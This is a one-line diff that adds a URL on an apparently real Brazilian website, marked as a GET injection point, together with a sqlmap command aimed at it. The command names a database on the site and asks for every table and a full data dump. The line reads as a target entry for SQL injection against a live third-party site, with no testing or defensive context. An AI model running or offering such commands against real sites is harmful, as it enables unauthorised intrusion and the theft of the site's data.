@@ -1,0 +1,1 @@
+https://www.bedel.com.br/portal/details.php?pg=noticias&codigo=145 (GET)  # sqlmap.py -u https://www.bedel.com.br/portal/details.php?pg=noticias&codigo=145 -D bedel_portal --tables --dump-all --threads 5 -v3
